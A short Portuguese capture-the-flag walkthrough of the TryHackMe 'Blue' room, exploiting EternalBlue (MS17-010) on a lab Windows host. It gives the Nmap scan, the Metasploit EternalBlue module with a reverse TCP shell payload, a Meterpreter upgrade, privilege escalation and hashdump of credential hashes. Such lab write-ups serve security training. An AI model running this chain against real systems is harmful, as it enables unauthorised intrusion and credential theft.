Blue

TryHackMe · Easy by Brenno M.

Blue é o estudo de caso clássico do EternalBlue (MS17-010), a vulnerabilidade de execução remota de código no SMBv1 do Windows explorada pelo WannaCry. A cadeia vai do recon à sessão SYSTEM via Metasploit.

Reconhecimento

O Nmap revela as portas típicas de Windows (135, 139, 445). O script de vulnerabilidades confirma o MS17-010.

nmap -sS -sV -Pn <IP>
nmap -p445 --script vuln <IP>
# smb-vuln-ms17-010: VULNERABLE (CVE-2017-0143)

Exploração

No Metasploit, seleciona-se o módulo do EternalBlue, definem-se alvo, host local e payload, e dispara-se o exploit.

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <MEU_IP>
set payload windows/x64/shell/reverse_tcp
exploit

Pós-exploração

A shell é convertida em Meterpreter e, com privilégios de SYSTEM, faz-se a coleta das flags.

# Ctrl+Z para background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i 2
getsystem
hashdump
